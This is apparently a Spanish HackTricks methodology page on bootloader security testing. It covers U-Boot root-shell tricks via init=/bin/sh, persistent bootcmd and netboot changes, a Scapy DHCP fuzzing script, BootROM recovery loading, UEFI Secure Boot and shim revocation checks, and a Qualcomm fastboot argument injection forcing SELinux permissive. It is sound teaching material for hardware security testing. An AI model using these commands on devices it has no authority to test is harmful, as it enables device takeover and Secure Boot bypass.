# Pruebas del bootloader

{{#include ../../banners/hacktricks-training.md}}

Se recomiendan los siguientes pasos para modificar las configuraciones de inicio del dispositivo y probar bootloaders como U-Boot y los cargadores de clase UEFI. Céntrate en conseguir la ejecución temprana de código, evaluar las protecciones de firma y rollback, y aprovechar las rutas de recuperación o de arranque por red.

Relacionado: bypass del secure boot de MediaTek mediante el patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Soluciones rápidas para U-Boot y abuso del entorno

1. Acceder al shell del intérprete
   - Durante el inicio, pulsa una tecla de interrupción conocida (a menudo cualquier tecla, 0, espacio o una secuencia "mágica" específica de la placa) antes de que se ejecute `bootcmd` para acceder al prompt de U-Boot.<sup>[[1]](#references)</sup>

2. Inspeccionar el estado de inicio y las variables
   - Comandos útiles:
     - `printenv` (volcar el entorno)
     - `bdinfo` (información de la placa, direcciones de memoria)
     - `help bootm; help booti; help bootz` (métodos disponibles para iniciar el kernel)
     - `help ext4load; help fatload; help tftpboot` (cargadores disponibles)

3. Modificar los argumentos de inicio para obtener un shell root
   - Añade `init=/bin/sh` para que el kernel abra un shell en lugar de ejecutar el proceso de inicio normal:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Arranque por red desde tu servidor TFTP
   - Configura la red y descarga una imagen de kernel/FIT desde la LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Persistir cambios mediante el entorno
   - Si el almacenamiento de variables de entorno no está protegido contra escritura, puedes persistir el control:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Comprueba si hay variables como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influyan en las rutas alternativas. Los valores mal configurados pueden permitir escapar repetidamente al shell.

6. Comprueba las funciones de depuración o inseguras
   - Busca: `bootdelay` > 0, `autoboot` deshabilitado, `usb start; fatload usb 0:1 ...` sin restricciones, posibilidad de usar `loady`/`loads` a través del puerto serie, `env import` desde medios no confiables y kernels/ramdisks cargados sin comprobar sus firmas.

7. Pruebas de imágenes/verificación de U-Boot
   - Si la plataforma afirma admitir arranque seguro/verificado con imágenes FIT, prueba imágenes sin firmar y manipuladas:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - La ausencia de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o el comportamiento heredado de `verify=n` suele permitir arrancar payloads arbitrarios.
   - No te limites a un simple resultado de permitir/denegar: investigaciones recientes sobre FIT mostraron que la propia ruta de verificación puede ser una superficie de ataque preautenticación. Prueba negativamente datos FIT almacenados externamente (`data-offset`, `data-position`, `data-size`), la selección de configuración firmada, `loadables` y el manejo de overlay / `extra-conf`.
   - Si tienes un árbol de código fuente coincidente, `test/vboot/vboot_test.sh` permite reproducir rápidamente el comportamiento de verificación de FIT en U-Boot sandbox antes de tocar hardware real.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` y flujos de arranque mediante scripts
   - En compilaciones modernas de U-Boot, `bootcmd` suele ser solo un wrapper de Standard Boot. Esto significa que los medios modificables, PXE o la memoria flash SPI pueden convertirse en el verdadero límite de confianza, aunque el entorno visible parezca inofensivo.
   - El `bootmeth` de `extlinux` busca `extlinux/extlinux.conf` en `/` y `/boot`; el `bootmeth` de script busca primero `boot.scr.uimg` y luego `boot.scr`. En el arranque por red, el nombre del archivo de script puede venir de `boot_script_dhcp`.
   - Comandos útiles para el análisis inicial:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Casos de abuso que probar: medios USB/SD controlados por un atacante antes en `boot_targets`, `/boot/extlinux/extlinux.conf` con permisos de escritura, un servidor TFTP malicioso que proporcione `boot.scr` o ejecución de scripts desde SPI mediante `script_offset_f`.
   - Si la plataforma depende de la verificación FIT, asegúrate de que las configuraciones estén firmadas a nivel de configuración y no solo por imagen; `required-mode=all` ofrece más seguridad que aceptar cualquier clave requerida individual.

## Superficie de arranque por red (DHCP/PXE) y servidores maliciosos

9. Fuzzing de parámetros PXE/DHCP
   - La gestión BOOTP/DHCP heredada de U-Boot ha tenido problemas de seguridad de memoria. Por ejemplo, CVE‑2024‑42040 describe una divulgación de memoria mediante respuestas DHCP manipuladas que pueden filtrar bytes de la memoria de U-Boot a través de la red.<sup>[[4]](#references)</sup> Prueba las rutas de código DHCP/PXE con valores excesivamente largos o de casos límite (nombre de archivo de arranque de la opción 67, opciones del proveedor, campos de nombre de archivo/nombre del servidor) y observa si se producen bloqueos/leaks.
   - Fragmento mínimo de Scapy para estresar los parámetros de arranque durante el arranque por red:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valida también si los campos de nombre de archivo PXE se pasan a la lógica del shell/loader sin sanitización cuando se encadenan con scripts de aprovisionamiento del lado del SO.

10. Pruebas de command injection en servidores DHCP rogue
   - Configura un servicio DHCP/PXE rogue e intenta inyectar caracteres en los campos de nombre de archivo u opciones para llegar a los intérpretes de comandos en etapas posteriores de la cadena de arranque. Metasploit’s DHCP auxiliary, `dnsmasq` o scripts personalizados de Scapy funcionan bien. Aísla primero la red del laboratorio.

## Modos de recuperación de la ROM del SoC que anulan el arranque normal

Muchos SoC exponen un modo "loader" de BootROM que acepta código por USB/UART incluso cuando las imágenes flash no son válidas. Si los fusibles de secure-boot no están quemados, esto puede proporcionar ejecución de código arbitrario muy pronto en la cadena.

- NXP i.MX (Serial Download Mode)
  - Herramientas: `uuu` (mfgtools3) o `imx-usb-loader`.
  - Ejemplo: `imx-usb-loader u-boot.imx` para cargar y ejecutar un U-Boot personalizado desde RAM.
- Allwinner (FEL)
  - Herramienta: `sunxi-fel`.
  - Ejemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` o `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Herramienta: `rkdeveloptool`.
  - Ejemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para cargar un loader y subir un U-Boot personalizado.

Evalúa si los eFuses/OTP de secure-boot del dispositivo están quemados. Si no lo están, los modos de descarga de BootROM suelen eludir cualquier verificación de nivel superior (U-Boot, kernel, rootfs) ejecutando directamente tu payload de primera etapa desde SRAM/DRAM.

## Bootloaders UEFI/de clase PC: comprobaciones rápidas

11. Pruebas de manipulación de ESP, rollback e inscripción de claves
   - Monta la EFI System Partition (ESP) y busca componentes del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` y rutas de logos del fabricante.
   - Vuelca el estado de Secure Boot y las bases de datos de claves desde el SO cuando sea posible:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Si la plataforma está en Setup Mode, acepta la inscripción de claves sin autenticación o incluye una Platform Key de prueba/predeterminada (clase PKfail), un administrador local o un atacante con acceso físico puede inscribir su propia KEK/db y mantener Secure Boot aparentemente «habilitado» mientras arranca binarios EFI arbitrarios.<sup>[[3]](#references)</sup>
   - Intenta arrancar con componentes de arranque firmados vulnerables conocidos o de versiones anteriores si las revocaciones de Secure Boot (dbx) no están actualizadas. Si la plataforma todavía confía en shims/bootmanagers antiguos, a menudo puedes cargar tu propio kernel o `grub.cfg` desde la ESP para obtener persistencia.

12. Pruebas de revocación de shim / SBAT / dbx obsoletos
   - Los shims antiguos firmados por Microsoft y las bifurcaciones de proveedores todavía pueden servir como vía de bootkit al estilo BYOVD si las revocaciones están obsoletas. En un laboratorio aislado, coloca en la ESP un shim históricamente vulnerable e intenta encadenar la carga de tu propio `grubx64.efi` o kernel.<sup>[[11]](#references)</sup>
   - Evaluación rápida:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Si el shim sigue ejecutándose a pesar de estar en la lista de revocación, el firmware/OS tiene actualizaciones `dbx` obsoletas o confía en un loader bifurcado que nunca heredó las protecciones SBAT upstream.

13. Bugs de análisis del logo de arranque (clase LogoFAIL)
   - Varios firmwares OEM/IBV eran vulnerables a flaws de análisis de imágenes en DXE que procesan los logos de arranque. Si un atacante puede colocar una imagen manipulada en la ESP bajo una ruta específica del vendor (p. ej., `\EFI\<vendor>\logo\*.bmp`) y reiniciar, podría ser posible ejecutar código durante las primeras etapas del arranque incluso con Secure Boot habilitado. Comprueba si la plataforma acepta logos proporcionados por el usuario y si esas rutas tienen permisos de escritura desde el OS.<sup>[[2]](#references)</sup>


## Brechas de confianza de Android/Qualcomm ABL + GBL (Android 16)

En dispositivos Android 16 que usan el ABL de Qualcomm para cargar la **Generic Bootloader Library (GBL)**, valida si ABL **autentica** la app UEFI que carga desde la partición `efisp`. Si ABL solo comprueba la **presencia** de una app UEFI y no verifica las firmas, una primitiva de escritura en `efisp` permite la **ejecución de código sin firma antes de que arranque el OS**.<sup>[[6]](#references)[[7]](#references)</sup>

Comprobaciones prácticas y vías de abuso:

- **Primitiva de escritura en efisp**: Necesitas una forma de escribir una app UEFI personalizada en `efisp` (root/servicio privilegiado, bug en una app OEM, ruta de recovery/fastboot). Sin esto, la brecha de carga de GBL no es directamente explotable.<sup>[[6]](#references)</sup>
- **Inyección de argumentos OEM de fastboot** (bug de ABL): Algunas builds aceptan tokens adicionales en `fastboot oem set-gpu-preemption` y los añaden a la cmdline del kernel. Esto puede usarse para forzar SELinux permisivo y permitir escrituras en particiones protegidas:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Si el dispositivo está parcheado, el comando debería rechazar los argumentos adicionales.<sup>[[5]](#references)[[6]](#references)</sup>
- **Desbloqueo del bootloader mediante flags persistentes**: Un payload de la etapa de arranque puede cambiar flags de desbloqueo persistentes (p. ej., `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sin las restricciones de aprobación/servidor del OEM. Esto cambia de forma duradera el estado del dispositivo tras el siguiente reinicio.<sup>[[6]](#references)</sup>

Notas defensivas/de triaje:

- Confirma si ABL realiza la verificación de firmas del payload GBL/UEFI desde `efisp`. Si no es así, considera `efisp` una superficie de persistencia de alto riesgo.
- Comprueba si los handlers fastboot OEM de ABL están parcheados para **validar la cantidad de argumentos** y rechazar tokens adicionales.<sup>[[8]](#references)[[9]](#references)</sup>

## Precaución con el hardware

Ten cuidado al interactuar con la memoria flash SPI/NAND durante el arranque inicial (p. ej., poniendo pines a tierra para omitir lecturas) y consulta siempre la hoja de datos de la memoria flash. Los cortocircuitos en el momento equivocado pueden corromper el dispositivo o el programador.

## Notas y consejos adicionales

- Prueba `env export -t ${loadaddr}` y `env import -t ${loadaddr}` para mover blobs de entorno entre la RAM y el almacenamiento; algunas plataformas permiten importar el entorno desde medios extraíbles sin autenticación.
- Para lograr persistencia en sistemas basados en Linux que arrancan mediante `extlinux.conf`, suele bastar con modificar la línea `APPEND` (para inyectar `init=/bin/sh` o `rd.break`) en la partición de arranque cuando no se aplican verificaciones de firma.
- Si el objetivo usa actualizaciones de doble ranura / A/B, revisa las técnicas anti-rollback y de desincronización de ranuras en la [descripción general del análisis de firmware](README.md) para no pasar por alto brechas de confianza exclusivas del actualizador que estén fuera del propio bootloader.
- Si el espacio de usuario proporciona `fw_printenv/fw_setenv`, verifica que `/etc/fw_env.config` coincida con el almacenamiento real del entorno. Los offsets mal configurados permiten leer/escribir en la región MTD equivocada.

## References

- [1] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Descubriendo LogoFAIL: los peligros del análisis de imágenes durante el arranque del sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: las claves de plataforma no confiables socavan Secure Boot en el ecosistema UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalles de CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: desbloqueo de Xiaomi mediante dos cadenas sin sanitizar](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [El exploit GBL de Qualcomm Snapdragon 8 Elite permite a los atacantes desbloquear bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arquitectura de Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: corregir la propagación de entrada no confiable a la línea de comandos del kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: añadir una comprobación para el comando set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [No apto para arrancar: cómo romper la verificación de firmas FIT de U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Nota de vulnerabilidad VU#616257: los bootloaders shim UEFI firmados por Microsoft son vulnerables a la omisión de Secure Boot](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
